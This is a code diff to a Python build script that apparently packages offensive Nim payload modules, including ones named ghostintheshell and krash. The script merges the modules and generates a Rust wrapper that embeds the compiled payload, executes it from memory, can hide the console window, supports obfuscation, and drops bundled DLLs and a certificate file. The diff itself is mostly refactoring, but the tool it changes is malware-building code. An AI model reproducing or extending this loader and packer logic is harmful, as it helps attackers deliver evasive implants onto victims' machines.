@@ -22,6 +22,7 @@ def compile_nim(nim_file, output_exe, os_name, arch, hide_console=False, nim_def
         "-d:release",
         "-d:ssl",
     ]
+    nim_cmd.append("-d:nimUseCurl")
 
     for define in nim_defines:
         nim_cmd.append(f"-d:{define}")
@@ -95,7 +96,7 @@ def extract_main_proc(nim_content):
 
     for line in lines:
         stripped_line = line.strip()
-        if stripped_line.startswith("proc main()"):
+        if stripped_line.startswith("proc main() ="):
             in_main = True
             proc_indent_level = len(line) - len(line.lstrip())
             continue
@@ -121,18 +122,16 @@ def apply_options_with_regex(content, options):
     let/const/var optionName = someFunc("default value")
     """
     if not options:
-        return content
+        return content, []
 
     new_options = []
     for option in options:
         if "=" in option:
             key, value = option.split("=", 1)
-            # This is a key-value pair, apply with regex
-            escaped_value = value.replace('\\', '\\\\').replace('"', '\\"')
-            pattern = re.compile(r'((?:let|const|var)\s+' + re.escape(key) + r'\s*=\s*(?:[a-zA-Z0-9_]+\()?)".*?"', re.DOTALL)
+            escaped_value = value.strip().replace('\\', '\\\\').replace('"', '\\"')
+            pattern = re.compile(r'((?:let|const|var)\s+' + re.escape(key) + r'\*\s*=\s*(?:[a-zA-Z0-9_]+\()?)".*?"', re.DOTALL)
             content = pattern.sub(r'\1"' + escaped_value + '"', content, count=1)
         else:
-            # This is a flag-like option, keep it for later
             new_options.append(option)
 
     return content, new_options
@@ -148,10 +147,11 @@ def merge_nim_modules(nim_files, out_dir: Path, options=None) -> (Path, list):
     out_path = out_dir / "combined.nim"
 
     merged_imports = set()
-    merged_code = []
+    module_bodies = []
+    other_code = []
     main_contents = []
-    remaining_options = list(options) if options else []
-
+    all_options = list(options) if options else []
+    
     for f in nim_files:
         fpath = Path(f)
         if not fpath.is_file():
@@ -160,71 +160,58 @@ def merge_nim_modules(nim_files, out_dir: Path, options=None) -> (Path, list):
         print(f"[*] Reading module: {f}")
         with open(f, "r", encoding="utf-8") as fh:
             content = fh.read()
-        
-        content, remaining_options = apply_options_with_regex(content, remaining_options)
 
-        main_contents.append(extract_main_proc(content))
+        content, _ = apply_options_with_regex(content, all_options) 
 
         lines = content.splitlines()
+        module_body = []
         in_main_proc = False
         main_proc_indent = -1
-        in_when_block = False
-        when_block_indent = -1
-        in_gorge_proc = False
 
         for line in lines:
             stripped = line.strip()
 
-            if in_main_proc and stripped and (len(line) - len(line.lstrip()) <= main_proc_indent):
-                in_main_proc = False
-            if in_when_block and stripped and (len(line) - len(line.lstrip()) <= when_block_indent):
-                in_when_block = False
-            if in_gorge_proc and stripped and (len(line) - len(line.lstrip()) == 0):
-                in_gorge_proc = False
-
-            if in_main_proc or in_when_block:
-                continue
-
             if stripped.startswith("proc main()"):
                 in_main_proc = True
                 main_proc_indent = len(line) - len(line.lstrip())
+                main_contents.append(extract_main_proc(content))
                 continue
+
+            if in_main_proc:
+                if stripped and (len(line) - len(line.lstrip()) <= main_proc_indent):
+                    in_main_proc = False
+                if in_main_proc or stripped.startswith("when isMainModule"):
+                    continue
+
             if stripped.startswith("when isMainModule"):
-                in_when_block = True
-                when_block_indent = len(line) - len(line.lstrip())
                 continue
-            
+
             if stripped.startswith("import "):
                 mods = stripped[len("import "):].split(",")
                 for m in mods:
                     merged_imports.add("import " + m.strip())
             else:
-                merged_code.append(line.rstrip("\n"))
-
-    final_code = []
-    if merged_code:
-        final_code.append(merged_code[0])
-        for i in range(1, len(merged_code)):
-            if merged_code[i].strip() == "" and merged_code[i-1].strip() == "":
-                continue
-            final_code.append(merged_code[i])
+                module_body.append(line)
+        
+        module_bodies.append("\n".join(module_body))
 
     final_content_parts = []
     final_content_parts.append("\n".join(sorted(merged_imports)))
     final_content_parts.append("\n\n")
-    final_content_parts.append("\n".join(final_code))
+    final_content_parts.append("\n\n".join(module_bodies))
     final_content_parts.append("\n\n")
     final_content_parts.append("proc main() =\n")
+
     for main_content in main_contents:
         if not main_content:
             continue
         final_content_parts.append("  block:\n")
         for line in main_content:
             final_content_parts.append("    " + line + "\n")
-    final_content_parts.append("\n")
-    final_content_parts.append("when isMainModule:\n")
+
+    final_content_parts.append("\nwhen isMainModule:\n")
     final_content_parts.append("  main()\n")
-    
+
     final_content = "".join(final_content_parts)
 
     with open(out_path, "w", encoding="utf-8") as fh:
@@ -232,7 +219,7 @@ def merge_nim_modules(nim_files, out_dir: Path, options=None) -> (Path, list):
 
     print("[*] --- Begin Combined Nim Code ---\n" + final_content + "\n[*] --- End Combined Nim Code ---")
     print(f"[+] Wrote merged Nim file: {out_path}")
-    return out_path, remaining_options
+    return out_path, []
 
 def patch_nim_file(nim_file: Path, options: list) -> list:
     """Injects const declarations into a single Nim file."""
@@ -257,7 +244,7 @@ def parse_target(target_str):
         sys.exit(1)
 
 
-def generate_rust_wrapper(nim_exe, final_exe, target_os, target_arch, embed_exe=None, obfuscate=False, ollvm=None, hide_console=False, embedded_dlls=None):
+def generate_rust_wrapper(nim_exe, final_exe, target_os, target_arch, embed_exe=None, obfuscate=False, ollvm=None, hide_console=False, embedded_files=None):
     """Generate a Rust wrapper for the Nim executable using in-memory execution."""
     final_exe_path = Path(final_exe)
     package_name = final_exe_path.stem
@@ -292,19 +279,19 @@ def generate_rust_wrapper(nim_exe, final_exe, target_os, target_arch, embed_exe=
     if target_os == "windows" and hide_console:
         windows_subsystem_attr = '#![windows_subsystem = "windows"]'
 
-    dll_declarations = ""
-    dll_drop_code = ""
-    if embedded_dlls:
-        dll_declarations_parts = []
-        dll_drop_code_parts = ["    // Drop required DLLs to the current directory"]
-        for i, (dll_name, dll_bytes) in enumerate(embedded_dlls.items()):
-            dll_bytes_array = ','.join(str(b) for b in dll_bytes)
-            dll_declarations_parts.append(f'const DLL_{i}_NAME: &str = "{dll_name}";')
-            dll_declarations_parts.append(f'const DLL_{i}_DATA: &[u8] = &[{dll_bytes_array}];')
-            dll_drop_code_parts.append(f'    std::fs::write(DLL_{i}_NAME, DLL_{i}_DATA).expect("Failed to write {dll_name}");')
+    file_declarations = ""
+    file_drop_code = ""
+    if embedded_files:
+        file_declarations_parts = []
+        file_drop_code_parts = ["    // Drop required files to the current directory"]
+        for i, (file_name, file_bytes) in enumerate(embedded_files.items()):
+            file_bytes_array = ','.join(str(b) for b in file_bytes)
+            file_declarations_parts.append(f'const FILE_{i}_NAME: &str = "{file_name}";')
+            file_declarations_parts.append(f'const FILE_{i}_DATA: &[u8] = &[{file_bytes_array}];')
+            file_drop_code_parts.append(f'    std::fs::write(FILE_{i}_NAME, FILE_{i}_DATA).expect("Failed to write {file_name}");')
         
-        dll_declarations = "\n".join(dll_declarations_parts)
-        dll_drop_code = "\n".join(dll_drop_code_parts)
+        file_declarations = "\n".join(file_declarations_parts)
+        file_drop_code = "\n".join(file_drop_code_parts)
 
     rust_code = f'''
 {windows_subsystem_attr}
@@ -313,14 +300,14 @@ use std::fs;
 
 {embed_decl}
 
-{dll_declarations}
+{file_declarations}
 
 const NIM_PAYLOAD: &[u8] = &[{nim_payload_array}];
 
 fn main() {{
 {embed_code}
 
-{dll_drop_code}
+{file_drop_code}
 
     unsafe {{
         memexec::memexec_exe(NIM_PAYLOAD).expect("Failed to execute Nim payload from memory");
@@ -438,15 +425,25 @@ def main():
         'MODULE/ghostintheshell.nim': {
             'cryptoDllData_b64': 'libcrypto-1_1-x64.dll',
             'sslDllData_b64': 'libssl-1_1-x64.dll'
+        },
+        'MODULE/krash.nim': {
+            'cryptoDllData_b64': 'libcrypto-1_1-x64.dll',
+            'sslDllData_b64': 'libssl-1_1-x64.dll'
         }
     }
 
     selected_module_paths = args.merge if args.merge else [args.nim_file]
-    embedded_dlls_for_rust = {}
+    embedded_files_for_rust = {}
     nim_options = list(args.option) if args.option else []
 
     for module_path in selected_module_paths:
         normalized_path = str(Path(module_path)).replace(os.sep, '/')
+        if normalized_path in ['MODULE/krash.nim', 'MODULE/ghostintheshell.nim']:
+            pem_path = dll_source_dir / 'cacert.pem'
+            if pem_path.exists() and not args.nim_only and target_os == 'windows':
+                print("[*] Queuing cacert.pem for Rust wrapper embedding.")
+                embedded_files_for_rust['cacert.pem'] = pem_path.read_bytes()
+
         if normalized_path in MODULE_DLLS:
             for const_name, dll_name in MODULE_DLLS[normalized_path].items():
                 dll_path = dll_source_dir / dll_name
@@ -454,7 +451,7 @@ def main():
                     dll_content = dll_path.read_bytes()
                     if not args.nim_only and target_os == 'windows':
                         print(f"[*] Queuing {dll_name} for Rust wrapper embedding.")
-                        embedded_dlls_for_rust[dll_name] = dll_content
+                        embedded_files_for_rust[dll_name] = dll_content
                     else:
                         print(f"[*] Embedding {dll_name} as base64 for {Path(module_path).name}")
                         b64_content = base64.b64encode(dll_content).decode('utf-8')
@@ -492,7 +489,7 @@ def main():
                 obfuscate=args.obfuscate,
                 ollvm=args.ollvm,
                 hide_console=args.hide_console,
-                embedded_dlls=embedded_dlls_for_rust
+                embedded_files=embedded_files_for_rust
             )
         else:
             if not args.nim_only and target_os != 'windows':
